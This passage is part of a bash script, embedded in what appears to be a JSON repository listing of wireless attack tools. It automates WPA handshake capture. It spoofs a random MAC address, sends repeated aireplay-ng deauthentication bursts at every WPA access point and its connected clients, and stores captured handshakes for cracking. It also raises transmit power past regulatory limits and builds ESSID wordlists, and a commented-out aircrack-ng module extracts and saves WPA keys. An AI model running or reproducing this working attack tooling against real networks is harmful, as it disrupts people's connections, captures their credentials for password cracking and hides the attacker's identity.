End~~~~~~~~~~~~~~~#\n\n#~~~~~~~~~~~~~~~Boost Device~~~~~~~~~~~~~~~#\n\nBOOST_DEVICE_fn()\n{\nifconfig $DEV down\nsleep .1\niwconfig $DEV mode managed\nsleep .1\nifconfig $DEV up\n\nclear\n\twhile true\n\tdo\n\necho \"\"\necho -e \"$q    Do you wish to boost your wifi device power to 30dBm?\"\necho -e \"$info  This routine works for the AWUSO36H and\" #(AWUSO)\necho -e \"$info  may work with other devices.\"\necho -e \"$inp  Type$yel (y/Y)$inp for yes or$yel (n/N)$inp for no.$txtrst\"\n\t\tread AWUSO\n\t\tcase $AWUSO in\n\t\ty|Y|n|N) break ;;\n\t\t~|~~)\n\t\techo Aborting -\n\t\texit\n\t\t;;\n\n\t\tesac\n\t\techo -e  \"$warn !!!Wrong input try again!!!$txtrst\"\n\n\t\t\tdone\n\n\tif [ $AWUSO == y ] || [ $AWUSO == Y ]; then\n\n\t\tifconfig $DEV down\n\t\tsleep 1\n\t\tiw reg set GY\n\t\tifconfig $DEV up\n\t\tiwconfig $DEV channel 13\n\t\tiwconfig $DEV txpower 30\n\n        \tsleep 2\n \n\t\t\tfi\n\nclear\n\n}\n\n#~~~~~~~~~~~~~~~End Boost Device End~~~~~~~~~~~~~~~#\n\n\nSELECT_DEVICE_fn\n\n\nif [[ \"$airmontype\" != \"Interface\" ]]; then\n\nSELECT_MONITOR_fn\n\n\tfi\n\nCOUNTTEST=ZZZ\n\nuntil [ $COUNTTEST == y ] || [ $COUNTTEST == Y ]; do  \n\nclear\n\necho \"\"\necho \"\"\necho -e \"$info$bold  $undr Program Cycles $txtrst\"\necho -e \"\"\necho -e \"$info     One(1) Program Cycle is composed of two(2) parts:\"\necho -e \"  Part I is an active scan of all targetAPs seen using deauth processes.\"\necho -e \"  Part II is a passive scan of all channels - airodump-ng silently\"\necho -e \"  collects data.\"\necho -e \"\"\necho -e \"$q  How many program cycle(s) do you wish to use?$txtrst\"\nread COUNT\n\n\tif [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then\n\n\tCOUNTTEST=y\n\t\n\telse\n\n\twhile true\n\n\tdo\n\necho \"\"\necho -e \"$inp  You entered$yel $COUNT$inp cycle(s), type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst\"\n\tread COUNTTEST\n\n\tcase $COUNTTEST in\n\ty|Y|n|N) break ;;\n\t~|~~)\n\techo Aborting -\n\texit\n\t;;\n\n\tesac\n\techo -e \"$warn  !!!Wrong input try again!!!$txtrst\"\n\n\tdone\n\n\tfi\n\t\tdone\n\n###############\nPAUSETEST=ZZZ\n\nuntil [ $PAUSETEST == y ] || [ $PAUSETEST == Y ]; do  \n\nclear\n\necho \"\"\necho -e \"$info$bold  $undr Pause Time  $txtrst\"\necho -e \"\"\necho -e \"$info     The program first scans for existing APs, then attempts to\"\necho -e \"  induce the collection of a handshake from each WPA encrypted AP\"\necho -e \"  found during the scan.\"\n\necho -e \"$info     Once all targets have undergone an aireplay-ng deauth process,\"\necho -e \"  the program enters the passive scan mode, to avoid constantly disrupt-\"\necho -e \"  ing networks thru active DDOS processes.\"\necho -e \"$info     During the passive phase, a countdown timer will be seen. When\"\necho -e \"  the passive phase ends, the program rescans all channels for WPA encryp-\"\necho -e \"  ed targets and recommences another active scan in an attempt to force\"\necho -e \"  handshake production using aireplay-ng --deauth.\"\necho -e \"     For both active and passive scans .cap files are collected and tested\"         \necho -e \"  for handshakes. If WPA handshakes are found within these files, the file\"\necho -e \"  is moved to the$yel /root/HANDSHAKEHOLD$info folder.\"\necho -e \"     If a handshake has been collected from a target, all subsequent\"\necho -e \"  active scans will skip this target if the .cap file is found in the\"\necho -e \"  /root/HANDSHAKEHOLD folder.\"\n\necho -e \"$q     How long in$yel MINUTE(S)$q do you want the program to pause in the\"\necho -e \"  passive scan mode. A 15 to 30 minute passive scan is suggested.$txtrst\"\n\nread PAUSE\n\n\tif [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then\n\n\tPAUSETEST=y\n\n\telse\n\n\twhile true\n\n\tdo\n\necho \"\"\necho -e \"$inp  You entered$yel $PAUSE$inp minute(s) type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst\"\n\tread PAUSETEST\n\n\tcase $PAUSETEST in\n\ty|Y|n|N) break ;;\n\t~|~~)\n\techo Aborting -\n\texit\n\t;;\n\n\tesac\n\techo -e \"$warn  !!!Wrong input try again!!!$txtrst\"\n\n\tdone\n\n\t\tfi\n\n\t\t\tdone\n\n# Change to Seconds for sleep\nPAUSE=$(expr \"$PAUSE\" \\* 60 )\n\n\nrequestnumTEST=ZZZ\n\nuntil [ $requestnumTEST == y ] || [ $requestnumTEST == Y ]; do  \n\nclear\necho \"\"\necho \"\"\necho -e \"$info$bold  $undr Aireplay-ng Deautherization Counts $txtrst\"\necho -e \"\"\necho -e \"$info     The program employs aireplay-ng --deauth when active\"\necho -e \"  scanning to induce the collection of handshakes.\"\necho -e \"$txtrst\"\necho -e \"  --deauth      count : deauthenticate 1 or all stations (-0)\"\necho \"\"\necho -e \"$inp     Enter the number(i.e. count) of --deauth you wish to send\"\necho -e \"  at the target network. Twenty(20) to Thirty(30) is normal.\"\necho -e \"$warn  DO NOT Enter Zero(0)!$txtrst\"\nread requestnum\n\nwhile  [ $requestnum = 0 ]; do\n\techo \"\"\n        echo -e \"$warn  !!!Donot use the number Zero(0)!!!\"\n\techo -e \"$q     How many --deauth bursts will you send at the targetAP?(COUNT)$txtrst\"\n      \tread requestnum\n\n\tdone\n\n\tif [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then\n\n\trequestnumTEST=y\n\n\telse\n\nwhile true\n\n\tdo\n\necho \"\"\necho -e \"$inp  You entered$yel $requestnum$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst\"\n\tread requestnumTEST\n\n\tcase $requestnumTEST in\n\ty|Y|n|N) break ;;\n\t~|~~)\n\techo Aborting -\n\texit\n\t;;\n\n\tesac\n\techo -e \"$warn  !!!Wrong input try again!!!$txtrst\"\n\n\tdone\n\n\t\tfi\n\n\t\t\tdone\n\nwhite_ap_mac_fn\n\n###############\n\nBOOST_DEVICE_fn\n\n##################### Collect Probes\n\nMANUAL_SELECT_fn()\n\n{\n\nclear\n\necho -e \"$info\n\n    Check Entries\n      To change enter$yel line number$info of entry and\n    follow program prompts.\n\n\n      1) Make ESSID Probe Wordlist Files      (y/n)? default=y/Y  \\e[1;36m$inp[$yel $USE_PROBE $inp]\n$info        Note if files become large program cycle may slow \n           If this slowing occurs rename files in\n           the /PROBEESSID_DATA and restart.\n\n      2) Make ESSID Probe Reference File      (y/n)? default=n/N  \\e[1;36m$inp[$yel $USE_REF $inp]\n$info        Note if files become large program cycle WILL slow \n           When this slowing occurs rename files in\n           the /PROBEESSID_DATA and restart.\n\n\n    C)ontinue$txtrst \n\\n\"\nread var\ncase $var in\n\n\t1) echo -e \"\\033[36m\\n$info Collect ESSID Probes (y/n)?$txtrst\"\n\tread USE_PROBE\n\tMANUAL_SELECT_fn;;\n\n\t2) echo -e \"\\033[36m\\n$info Make ESSID Reference File (y/n)?$txtrst\"\n\tread USE_REF\n\tMANUAL_SELECT_fn;;\n\n\tc|C)\n\n\t if [[ -z $USE_REF || -z $USE_PROBE ]]; then\n\t\techo -e \"\\033[31m$warn Something is wrong - try again\"\n\t\tsleep 1\n\t\tMANUAL_SELECT_fn\n\t\tfi;;\n\n\t*) \tMANUAL_SELECT_fn;;\nesac\n\n}\n\n#~~~~~~~~~~~~~~~End Manual Handeling End~~~~~~~~~~~~~~~#\n\nMANUAL_SELECT_fn\n\n#############\n\n#let COUNT=COUNT-1\nhandcol=0\n\nprepare_fn()\n{\nrm -f /tmp/HANDTEST/*\nclear\necho -e \"$txtrst\"\necho -e \"[+] ********** Starting Scan **********\"\necho -e \"[+] use ctrl+c to terminate the program\" \nsleep 2\n\n#variables\n\nif [ \"$airmontype\" == \"Interface\" ]; then\n\nmonitor=\"$DEV\"mon\nsleep 2\n\n\necho -e \"[+] killing Processes\"\nairmon-ng check kill &>dev\\null # kill processes\n\n\tfi\n\nif [ \"$airmontype\" != \"Interface\" ]; then\n\nmonitor=$MON\nsleep 2\n\n\tfi\n\nsleep 2\n\nifconfig $DEV up\n\n# MTeams programmer comments\n# Sent to MTeams STO region for review following seen\n# bring iw scans into existing timeseldeauh\n# Preliminary bugs for MTeams programmer J\n# iw scans not consistent if run seperately\n# Work from same scan list or channels/essid/bssid may not match\n# Do not run many iw scans as do not match run only one then to file\n# Due to spaces in essid names use mac addresses instead.\n# will only then affect file names will handle w/ awk. \n# some ops like arrays crash slow compuers if not slowed\n# run tests w/ slowest computer on persistent usb before release\n# General scan then strip out WPA APs.\n# \n# Wake APs up \n# Do a few dummy scans to get a better result.\n# See prelim coding below\n\necho -e \"[+] Please Standby................\"\necho -e \"[+] To Wake Up All APs in the Reception Range.\"\necho -e \"[+] Several Preliminary Scans Are Made.\"\n\n#iw $DEV scan &>dev\\null\nscan_fn\n#iw $DEV scan &>dev\\null\nscan_fn\n#iw $DEV scan &>dev\\null\nscan_fn\n#iw $DEV scan &>dev\\null\nscan_fn\n# Work from same scan list or channels/essid/bssid may not match\n# Basic document for all var\n\niw $DEV scan | cat > /tmp/HANDTEST/iwscan01.txt\necho -e \"[+] Scan 5 Writing Scan to file continuing...........\"\n\n#Debug \n#echo \"Debug\"\n#echo \"Erase all but target for test from /tmp/HANDTEST/iwscan01.txt\"\n#cp -f /root/iwscan01.txt /tmp/HANDTEST/iwscan01.txt\n#read \n#Debug\n##############MajoTom add\n\n# Insert newline at the beginning of file\nawk 'BEGIN {print \"\\n\"} {print}' /tmp/HANDTEST/iwscan01.txt > /tmp/HANDTEST/iwscan02.txt\n\n# Make one line per AP, replace newlines with tabs, put tab after BSSID\nawk 'BEGIN {RS=\"\\nBSS \"} NR>1 {gsub(/\\n/,\"\\t\"); gsub(/\\(on /,\"\\t\"); print}' /tmp/HANDTEST/iwscan02.txt > /tmp/HANDTEST/iwscan03.txt\n\n# Remove non WPA APs\nawk '/(WPA:|RSN:)/' /tmp/HANDTEST/iwscan03.txt > /tmp/HANDTEST/iwscan04.txt\n\n# Make a CSV file consisting of BSSID (capitalized), Channel and SSID\nsed -r 's/([^\\t]*).*SSID: ([^\\t]*).*DS Parameter set: channel ([^\\t]*).*/\\U\\1\\E,\\3,\\2/\n\n# Replace spaces with undescores (in SSIDs)\n\ns/ /_/g\n\n# Replace empty SSIDs with [hidden]\n\ns/(,$)/,[hidden]/' /tmp/HANDTEST/iwscan04.txt > /tmp/HANDTEST/iwscan05.txt\n\n# Musket add to replace underscores at end of bssid in kali 1.10a\n# Poss cause by vagaries in iw scans\n# Sort by SSID descending\n\n# debug Meam Prog if nofile increase sleep time before remove and sort\n\nsleep 2\n\ncat < /tmp/HANDTEST/iwscan05.txt | sed 's/_,/,/g' | sort -t, -k3 -r > /tmp/HANDTEST/iwscan06.txt\n\nSSIDS=$(awk -F, '{print $3}' /tmp/HANDTEST/iwscan06.txt)\nBSSIDS=$(awk -F, '{print $1}' /tmp/HANDTEST/iwscan06.txt)\nCHANN=$(awk -F, '{print $2}' /tmp/HANDTEST/iwscan06.txt)\n\nif [ ! -d \"/root/scans\" ]; then mkdir -m 700 /root/scans; fi\nTS=$(date +%y%m%d-%H%M)\ncp -f /tmp/HANDTEST/iwscan01.txt /root/scans/hsh-$TS.txt\ncp -f /tmp/HANDTEST/iwscan06.txt /root/scans/hsh-$TS.csv\n\nnumber1=$(wc -l <<< \"$SSIDS\")\nnumber2=$(wc -l <<< \"$BSSIDS\")\nnumber3=$(wc -l <<< \"$CHANN\")\n\n####MajorTom Adds end\n\nnumi1=$number1 # important for the loop\n\n#Leave to Debug in future\n#echo \"number1=$number1  SSIDS\" \n#echo \"number2=$number2  BSSIDS\"\n#echo \"number3=$number3  CHANN\"\n\necho \"[+] Target APs Found\"\necho \"$SSIDS\" \n#echo \"BSSIDS=$BSSIDS\"\n#echo \"CHANN=$CHANN\"\n\nif [[ $number1 == $number2  &&  $number1 == $number3  ]]; then\n\n\techo -e \"[+] Scan Successful $number1 WPA Networks Seen.\"\n\techo -e \"[+] Standby program is loading..............\"\n\t\t\tsleep 2\n\techo -e \" \"\n\n\telse \n\n        echo -e \"[+] Scan unsuccessful trying again.\"\n\t\t\tsleep 3\n\t\t\tprepare_fn\n\t\tfi\t  \n\n#mac=$(macchanger -s $DEV|grep Current|awk '{ print $3 }') # get mac address\nsleep 1\n\nnumber_of_files=$(ls -A /root/HANDSHAKEHOLD | wc -l)\n\nif [ \"$number_of_files\" != 0 ]; then\n\nls -1 /root/HANDSHAKEHOLD/* | xargs -n1 basename | sed 's/-.*//' | awk '{a [$1]++}! (a[$1]-1)' | dos2unix | tr [a-f] [A-F] | cat > /tmp/HANDTEST/caplist.txt 2> /dev/null\n\n# Place in array\n\nsleep 2\n\nreadarray bssidcaplist < /tmp/HANDTEST/caplist.txt\n\n# Start array search at zero\n\n\tfi\n\nattack_fn\n\n}\n\nattack_fn() \n\n{                                                                                \n\n#if [ ! -d \"/root/scans\" ]; then mkdir -m 700 /root/scans; fi\n#TS=$(date +%y%m%d-%H%M)\n#cp -f /tmp/HANDTEST/iwscan01.txt /root/scans/hsh-$TS.txt\n#cp -f /tmp/HANDTEST/iwscan06.txt /root/scans/hsh-$TS.csv\n\nrm -f /tmp/HANDTEST/*\nsleep .2\n\nsleep .2\nkillall -q airodump-ng &>dev\\null\nsleep .2\nkillall -q aireplay-ng &>dev\\null\nsleep .2\nkillall -q xterm &>dev\\null\n\nsleep 3\n\n# Check if handshakes collected\n# Make file list with $bssid\n\n\nif  [[ $numi1 == 0 ]]; then\n\t\n\techo -e \"[+] No WPA Encrypted Networks Seen.\"\n\techo -e \"[+] Entering Passive Scan Phase for $COUNT Minute(s).\"\n\tsleep 3 \n\tpassive_scan\n\n\t\tfi\n\nif  [[  $numi1 > 0 ]]; then \n\n\tbssidvar=0\n\thandshakecollect\n\n\t    fi\n\nif [[ $numi1 > 0 ]];then\n\nssid=$(echo $SSIDS|awk '{ print $'$numi1' }') # cut SSID list\nbssid=$(echo $BSSIDS|awk '{ print $'$numi1' }')\n#To uppercase\nbssid=$(echo $bssid | tr [a-f] [A-F])\nchannel=$(echo $CHANN|awk '{ print $'$numi1' }') # cut Channel list\n\nsleep 3\n#########Old\n#if [[ \"$airmontype\" == \"Interface\" ]]; then\n\n#echo -e \"[+] putting $DEV in monitor mode @ $monitor with channel $channel.\" # notify monitor mode\n#sleep 3\n#airmon-ng start $DEV &>dev\\null # start monitor mode on interface\n \n#echo \"[+] Spoofing with random mac address.\"\n#\tifconfig $monitor down  \n#\tmacchanger -A $monitor &>dev\\null\n#\tsleep 2 # give op time to complete\n#\tifconfig $monitor up\n#       randev_mac=$(ifconfig $monitor | awk '{print $5}')\n#            sleep 0.5\n#       randev_mac=$(echo $randev_mac | awk '{print $1}'| sed -e  's/^\\(.\\{17\\}\\).*$/\\1/' | sed -r 's/[-]+/:/g') # limit to 17 in length and replace - with :\n\n\n#\t\tfi\n\n#From varmacscan handels ifconfig dif between kali2.0 and 2016\n#############################\nif [[ \"$airmontype\" == \"Interface\" ]]; then\n\necho -e \"[+] Putting $DEV in monitor mode @ $monitor.\" # notify monitor mode\nsleep 3\nairmon-ng start $DEV &>dev\\null # start monitor mode on interface\nsleep 1\necho \"[+] Spoofing with random mac address.\"\n\n\tifconfig $monitor down  \n\tiwconfig $monitor mode manage\n\tmacchanger -A $monitor &>dev\\null\n\tsleep 2 # give op time to complete\n\tifconfig $monitor up\n\n\t\tif [[ $ifselect == old ]]; then\n\n            randev_mac=$(ifconfig $monitor | awk '{print $5}')\n            sleep 1\n\n\t\t\tfi\n\n\t\tif [[ $ifselect == new ]]; then\n\nrandev_mac=$(ifconfig $monitor | awk '{if (($1 == \"ether\") || ($1 == \"unspec\")) {print $2}}') 2>/dev/null\n\n\t\tfi\n\n            sleep 1\n\n\n\n\t# limit to 17 in length and replace - with : and lower to upper\n\n\trandev_mac=$(echo $randev_mac | awk '{print $1}'| sed -e  's/^\\(.\\{17\\}\\).*$/\\1/' | sed -r 's/[-]+/:/g' | sed 's/\\([a-z]\\)/\\U\\1/g')\n\n\tifconfig $monitor down\n\tiwconfig $monitor mode manage\n\tsleep .5\n\tifconfig $monitor hw ether $randev_mac\n\tsleep 2\n\tiwconfig $monitor mode monitor\n\tifconfig $monitor up\n\n\t\tfi\n#############################\n\n\nif [[ \"$airmontype\" != \"Interface\" ]]; then\n\n\tifconfig $DEV down\n        iwconfig $DEV mode manage\n\tifconfig $DEV up\n\tifconfig $DEV down \n\tmacchanger -A $DEV &>dev\\null\n\tsleep 2  # give time for op\n\tifconfig $DEV up \n\tVARMAC=$(ifconfig $DEV | grep \"$DEV     Link encap:Ethernet  HWaddr \" | sed s/\"$DEV     Link encap:Ethernet  HWaddr \"//g)\n\tVARMAC=$(echo $VARMAC | awk '{print $1}'| sed -e  's/^\\(.\\{17\\}\\).*$/\\1/' | sed -r 's/[-]+/:/g' | sed 's/\\([a-z]\\)/\\U\\1/g')\n\n\tsleep .5\n\tifconfig $DEV down\n\tifconfig $DEV hw ether $VARMAC\n\tifconfig $DEV up\n\tifconfig $monitor down &>dev\\null\n\tmacchanger -m $VARMAC $monitor &>dev\\null\n\tsleep 2  # give time for op\n\tifconfig $monitor up &>dev\\null\necho -e \"[+] putting $DEV in monitor mode @ $monitor with channel $channel\" # notify monitor mode\n\tifconfig $DEV down &>dev\\null\n\tiwconfig $DEV mode monitor &>dev\\null\n\tifconfig $DEV up &>dev\\null\n\n\t\tfi\n\nsleep 3\nESSIDNAME2=\nclear\necho -e \"$txtrst\"\necho -e \"[+] *******************************\"\necho -e \"[+] * Active Attack Phase Started *\"\necho -e \"[+] Attacking Scanned Networks Seen.\"                                 \necho -e \"[+] Cycles Remaining   : $COUNT\"\necho -e \"[+] Targets This Cycle : $number1\"\necho -e \"[+] Targets Remaining  : $numi1\"\necho -e \"[+] current SSID       : $ssid\"\necho -e \"[+] current BSSID      : $bssid\"\n\nif [[ \"$airmontype\" == \"Interface\" ]]; then\n\necho \"[+] current Device Mac : $randev_mac\"\n\n\t\tfi\n\nif [[ \"$airmontype\" != \"Interface\" ]]; then\n\necho \"[+] current Device Mac : $VARMAC\"\n\n\t\tfi\n\necho \"[+] Channel            : $channel\"\n\n\tif [ handcol > 0 ]; then\n\necho \"[+] Total WPA Handshakes Collected = $handcol\"\necho \"[+] See /root/HANDSHAKEHOLD for .cap files\"\necho \"[+] Opening airodump-ng to collect handshake.\"\n\t\t\tfi\n\nif [[ $wpsavail == --wps ]]; then\n\nxterm -g 95x15-1+100 -T \"Airodump-ng $ssid\" -e \"airodump-ng -c $channel --wps --berlin 10000000 --beacons --bssid $bssid -w /tmp/HANDTEST/$bssid  $monitor\" 2> /dev/null & airoscan=$!\n\nelse\n\nxterm -g 95x15-1+100 -T \"Airodump-ng $ssid\" -e \"airodump-ng -c $channel --bssid $bssid -w /tmp/HANDTEST/$bssid  $monitor\" 2> /dev/null & airoscan=$!\n\n\tfi\n\nsleep 5\n\necho \"[+] Sending first deauth burst at target network $bssid.\"\n\nsleep 5\n\ncushion=$requestnum\n\nxterm -g 80x15-1+400 -T \"Aireplay-ng $ssid\" -e \"aireplay-ng --deauth $requestnum -a $bssid $monitor\" 2> /dev/null & airescan=$!\n\nsleep $cushion\n\necho \"[+] Waiting for any handshake exchange to be completed and processed.\"\n\nsleep 20\n\nkill $airescan 2>/dev\\null\nkillall -q aireplay-ng &>dev\\null\n\necho \"[+] Checking .cap file for presence of handshake from first deauth burst.\"\n\nWPA_CAP_fn\n\n\tif [[ $shakstat == 0 ]]; then\n\necho \"[+] Sending second deauth burst at target network $bssid.\"\n\nxterm -g 80x15-1+400 -T \"Aireplay-ng $ssid\" -e \"aireplay-ng --deauth $requestnum -a $bssid $monitor\" 2> /dev/null & airescan=$!\n\nsleep $cushion\n\necho \"[+] Waiting for any handshake exchange to be completed and processed.\"\n\nsleep 20\n\nkill $airescan 2>/dev\\null\nkillall -q aireplay-ng &>dev\\null\n\n###########\n\necho \"[+] Checking .cap file for presence of handshake from second deauth burst.\"\n\nWPA_CAP_fn\n\n\t\tfi\n\nASSOC_CLIENT_fn\n\n\tif [[ ! -z $CLIASO_MAX ]] && [[ $shakstat == 0 ]]; then\n\necho -e \"$txtrst[+]\"\necho -e \"$txtrst[+] Beginning Deauth Process against $CLIASO_MAX .\"\necho -e \"$txtrst[+] Client with highest activity.\"\necho -e \"$txtrst[+] Sending first deauth burst at client $CLIASO_MAX.\"\n\nxterm -g 80x15-1+400 -T \"Aireplay-ng $ssid\" -e \"aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MAX $monitor\" 2> /dev/null & cliscan=$!\n\nsleep $cushion\nsleep 20\n\nkill $cliscan 2>/dev\\null\nkillall -q aireplay-ng &>dev\\null\n\n\nWPA_CAP_fn\n\n\t\tfi\n\n\tif [[ ! -z $CLIASO_MAX ]] && [[ $shakstat == 0 ]]; then\n\necho -e \"$txtrst[+] Sending second deauth burst at client $CLIASO_MAX.\"\n\nxterm -g 80x15-1+400 -T \"Aireplay-ng $ssid\" -e \"aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MAX $monitor\" 2> /dev/null & cliscan=$!\n\nsleep $cushion\nsleep 20\n\nkill $cliscan 2>/dev\\null\nkillall -q aireplay-ng &>dev\\null\n\nWPA_CAP_fn\n\n\t\tfi\n\n\tif [[ ! -z $CLIASO_MID ]] && [[ $shakstat == 0 ]]; then\n\necho -e \"$txtrst[+]\"\necho -e \"$txtrst[+] Beginning Deauth Process against $CLIASO_MID.\"\necho -e \"$txtrst[+] Client shows lower activity.\"\necho -e \"$txtrst[+] Sending first deauth burst at client $CLIASO_MID.\"\n\nxterm -g 80x15-1+400 -T \"Aireplay-ng $ssid\" -e \"aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MID $monitor\" 2> /dev/null & cliscan=$!\n\nsleep $cushion\nsleep 20\n\nkill $cliscan 2>/dev\\null\nkillall -q aireplay-ng &>dev\\null\n\n\nWPA_CAP_fn\n\n\t\tfi\n\n\tif [[ ! -z $CLIASO_MID ]] && [[ $shakstat == 0 ]]; then\n\necho -e \"$txtrst[+] Sending second deauth burst at client $CLIASO_MID.\"\n\nxterm -g 80x15-1+400 -T \"Aireplay-ng $ssid\" -e \"aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MID $monitor\" 2> /dev/null & cliscan=$!\n\nsleep $cushion\nsleep 20\n\nkill $cliscan 2>/dev\\null\nkillall -q aireplay-ng &>dev\\null\n\n\nWPA_CAP_fn\n\n\t\tfi\n\n\tif [[ ! -z $CLIASO_LOW ]] && [[ $shakstat == 0 ]]; then\n\necho -e \"$txtrst[+]\"\necho -e \"$txtrst[+] Beginning Deauth Process against $CLIASO_LOW.\"\necho -e \"$txtrst[+] Client shows lowest activity.\"\necho -e \"$txtrst[+] Sending first deauth burst at client $CLIASO_LOW.\"\n\nxterm -g 80x15-1+400 -T \"Aireplay-ng $ssid\" -e \"aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_LOW $monitor\" 2> /dev/null & cliscan=$!\n\nsleep $cushion\nsleep 20\n\nkill $cliscan 2>/dev\\null\nkillall -q aireplay-ng &>dev\\null\n\n\nWPA_CAP_fn\n\n\t\tfi\n\n\tif [[ ! -z $CLIASO_LOW ]] && [[ $shakstat == 0 ]]; then\n\necho -e \"$txtrst[+] Sending second deauth burst at client $CLIASO_LOW.\"\n\nxterm -g 80x15-1+400 -T \"Aireplay-ng $ssid\" -e \"aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_LOW $monitor\" 2> /dev/null & cliscan=$!\n\nsleep $cushion\nsleep 20\n\nkill $cliscan 2>/dev\\null\nkillall -q aireplay-ng &>dev\\null\n\n\nWPA_CAP_fn\n\n\t\tfi\n\n######################## Check for assocition reattack if assoc seen\n\nsleep .2\nkill $airoscan 2>/dev\\null\nkillall -q airodump-ng &>dev\\null\nsleep .2\nkillall -q aireplay-ng &>dev\\null\nsleep .2\nkillall -q xterm &>dev\\null\nsleep 3\n\n\n\nif [[ \"$WPAZERO\" != \"(0 handshake)\" ]]; then\n\nESSIDNAME=$(wpaclean /tmp/HANDTEST/holdwpaclean /tmp/HANDTEST/\"$bssid-01.cap\" | awk -F ' ' '{if ($1 == \"Net\"){ print $3 }}')\n\nsleep 1\n\n#Remove Spaces in ESSIDNAME\n\nif [ ! -z $ESSIDNAME ]; then\n\n\tESSIDNAME1=$(echo $ESSIDNAME | xargs)\n\n\tESSIDNAME2=${ESSIDNAME1// /_}\n\n\t\tfi\n\n# Double Testfor handshake as wpaclean can produce false positives\n\nif [ ! -z $ESSIDNAME2 ]; then\n\tlet handcol=$handcol+1\n\tDATEFILE=$(date +%y%m%d-%H:%M)\n        sleep 1\n\tchmod 755 /tmp/HANDTEST/$bssid-01.cap \n\tcp -f /tmp/HANDTEST/$bssid-01.cap /root/HANDSHAKEHOLD/$bssid-$ESSIDNAME2-$DATEFILE.cap\n\tsleep 1\n    \techo \"[+] A Valid Handshake moved to /root/HANDSHAKEHOLD/$bssid-$ESSIDNAME2-$DATEFILE.cap\"\n\tsleep 3\n\n\tfi\n\t\tfi\n\n########################aircrack-ng module REM\n\n# Loads aircrack-ng into xterm window\n\n#xterm -g 90x30-1+400 -T \"Aircrack-ng $ssid\" -e \"aircrack-ng /root/HANDSHAKEHOLD/$bssid-$ESSIDNAME2-$DATEFILE.cap -w PROBEESSID_DATA/essidprobes8dic.txt 2>&1 | tee /tmp/HANDTEST/aircracktest.txt; sleep 500\" &\n\n# Remove control characters and text strings from aircrack-ng tee output file\n\n#cat /tmp/HANDTEST/aircracktest.txt | sed 's/\\x1b//g' | sed 's/11B//g' > /tmp/HANDTEST/aircracktest1.txt\n\n# the head -1 produces only first instance  \n\n\n#\t\tfi\n#\t\t\tfi\n\n#WPAFND=$(cat < /tmp/HANDTEST/\"aircracktest1.txt\" | grep FOUND! | head -1 | awk '{print $2}' | xargs)\n\n#debug\n#echo \"WPAFND=$WPAFND\"\n#read\n\n#if [[ \"$WPAFND\" == \"FOUND!\" ]]; then\n\n#\techo \"[+] Aircrack-ng has found the WPA Key\"\n \n#\tcat < /tmp/HANDTEST/\"aircracktest1.txt\" | grep FOUND! | head -1 > /root/HANDSHAKEHOLD/WPA-KEY-FOUND-$bssid-$ESSIDNAME2-$DATEFILE\n\n#\techo \"WPA Key found between brackets []\" >> /root/HANDSHAKEHOLD/WPA-KEY-FOUND-$bssid-$ESSIDNAME2-$DATEFILE\n\t \n#\tfi\n\ncountcsv1=`ls -1 /tmp/HANDTEST/*.csv 2>/dev/null | wc -l`\n\n#echo \"debug 2307 $countcsv1\"\n\n\tif [[ $countcsv1 != 0 ]]; then\n\t\t\n\t\tcp /tmp/HANDTEST/*.csv  /tmp/ESSIDPROBE_DIR/\n\n\t\tfi\n\n#countcsv1=`ls -1 /root/*.csv 2>/dev/null | wc -l`\n\n#\tif [[ $countcsv1 != 0 ]]; then\n\n#\tcp -f /root/*.csv /tmp/ESSIDPROBE_DIR/ 2>/dev/null\n\n#\t\tfi\n\n#\techo \"[+]\"\n#    \techo \"[+] Copying .csv files to /tmp/ESSIDPROBE_DIR/\"\n\n#\tif [ -f \"/tmp/ESSIDPROBE_DIR/$bssid-01.csv\" ]; then\n\n#\tif [ -f \"/tmp/ESSIDPROBE_DIR/*.csv\" ]; then\n\n\tcountcsv1=`ls -1 /tmp/ESSIDPROBE_DIR/*.csv 2>/dev/null | wc -l`\n\n\tif [[ $countcsv1 != 0 ]]; then\n    \n             echo \"[+]\"\n\t     echo \"[+] Moving any possible WPA keys in clear text to\" \n             echo \"[+]   /root/PROBEESSID_DATA/essidprobesdic.txt\"\n\t     echo \"[+] for use with aircrack-ng,pyrite or elcomsoft.\"\n\t     echo \"[+]\"\n\t     sleep 3\n\n\tif [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then\n\n\t\tESSIDPROBE_fn\n\n\t\t\tfi\n\n\tif [[ $USE_REF == y || $USE_REF == Y ]]; then\n\n\t\tESSIDREF_fn\n\n\t\t\tfi\n\n\n\t\tfi\n\nnumi1=$(expr \"$numi1\" - 1) # loop number of networks in the number of SSID from ssid list\n\nif [[ $numi1 = 0 && $COUNT > 0 ]]; then\n\n\tpassive_scan\n\n\t\tfi\n\nif [[ $numi1 = 0 && $COUNT = 0 ]]; then\n\nexit_fn # exit\n\n\tfi\n\n\tif [[ \"$airmontype\" == \"Interface\" ]]; then\n\n\t\tairmon-ng stop $monitor &>dev\\null # stop monitor\n\n\t\tfi\n\nattack_fn # loop back to function\n\n\t\tfi\n\n}\n\nprepare_fn\n#done\n"
        },
        {
          "name": "hashcatch",
          "type": "commit",
          "content": null
        },
        {
          "name": "hcx-wifite",
          "type": "commit",
          "content": null
        },
        {
          "name": "hcxtools",
          "type": "commit",
          "content": null
        },
        {
          "name": "hijack",
          "type": "commit",
          "content": null
        },
        {
          "name": "horst",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-acs",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-ap6210",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-karma",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-mana",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-rtl",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-rtl871xdrv",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-wpe",
          "type": "commit",
          "content": null
        },
        {
          "name": "hostapd-wpe-auto",
